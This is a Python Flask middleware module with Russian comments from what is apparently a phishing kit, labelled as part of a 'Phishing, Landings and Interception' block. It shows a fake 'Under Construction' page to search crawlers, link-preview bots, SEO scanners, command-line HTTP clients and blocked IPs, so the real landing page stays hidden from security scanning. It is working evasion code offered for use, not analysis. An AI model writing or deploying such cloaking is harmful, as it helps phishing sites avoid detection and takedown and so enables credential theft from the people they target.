"""
Middleware клоакинга для лендингов.

Блок 4: Фишинг, Лендинги и Перехват.
Отображает фейковую версию страницы для ботов и сканеров.
"""
import re
from flask import request, render_template_string
from core.logger import log

# Список User-Agent паттернов для определения ботов
_BOT_UA_PATTERNS = [
    r'googlebot', r'bingbot', r'yandexbot', r'duckduckbot', r'baiduspider',
    r'facebookexternalhit', r'twitterbot', r'rogerbot', r'linkedinbot',
    r'embedly', r'quora link preview', r'showyoubot', r'outbrain',
    r'pinterest.*bot', r'slackbot', r'vkshare', r'w3c_validator',
    r'screaming frog', r'ahrefs', r'semrush', r'mj12bot', r'dotbot',
    r'python-requests', r'curl', r'wget', r'libwww', r'scrapy',
    r'httpclient', r'java/', r'okhttp', r'go-http-client',
]

_BOT_UA_RE = re.compile('|'.join(_BOT_UA_PATTERNS), re.IGNORECASE)

# IP-диапазоны, которые всегда должны видеть оригинальную страницу (whitelist)
_WHITELISTED_IPS: set = set()

# Фейковая страница для ботов
_FAKE_PAGE_HTML = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Under Construction</title></head>
<body style="font-family:sans-serif;text-align:center;padding:80px;color:#555">
<h1>🚧 Site Under Construction</h1>
<p>We're working hard to bring you something amazing. Check back soon!</p>
</body>
</html>"""


def _get_cloak_config() -> dict:
    """Читает настройки клоакинга из базы данных."""
    try:
        from core.database import SessionLocal
        from models.panel_settings import PanelSettings
        db = SessionLocal()
        try:
            keys = ['cloaking_enabled', 'cloaking_fake_page', 'cloaking_blocked_ips']
            settings = {s.key: s.value for s in db.query(PanelSettings).filter(
                PanelSettings.key.in_(keys)
            ).all()}
            return settings
        finally:
            db.close()
    except Exception:
        return {}


def is_bot_request() -> bool:
    """
    Определяет, является ли текущий запрос ботом/сканером.
    
    :return: True если запрос от бота
    """
    ua = request.headers.get('User-Agent', '')
    if _BOT_UA_RE.search(ua):
        return True
    return False


def get_visitor_ip() -> str:
    """Получает реальный IP посетителя."""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip:
        ip = ip.split(',')[0].strip()
    return ip or request.remote_addr


def should_cloak() -> bool:
    """
    Проверяет, нужно ли отдать фейковую страницу.
    
    :return: True если нужно показать фейковую версию
    """
    config = _get_cloak_config()
    if config.get('cloaking_enabled', 'false') != 'true':
        return False
    
    visitor_ip = get_visitor_ip()
    
    # Проверяем whitelist
    if visitor_ip in _WHITELISTED_IPS:
        return False
    
    # Проверяем заблокированные IP из настроек
    blocked_ips_raw = config.get('cloaking_blocked_ips', '')
    if blocked_ips_raw:
        blocked_ips = {ip.strip() for ip in blocked_ips_raw.split('\n') if ip.strip()}
        if visitor_ip in blocked_ips:
            return True
    
    return is_bot_request()


def get_fake_page() -> str:
    """
    Возвращает HTML фейковой страницы.
    
    :return: HTML фейковой страницы
    """
    config = _get_cloak_config()
    custom_page = config.get('cloaking_fake_page', '')
    return custom_page if custom_page else _FAKE_PAGE_HTML
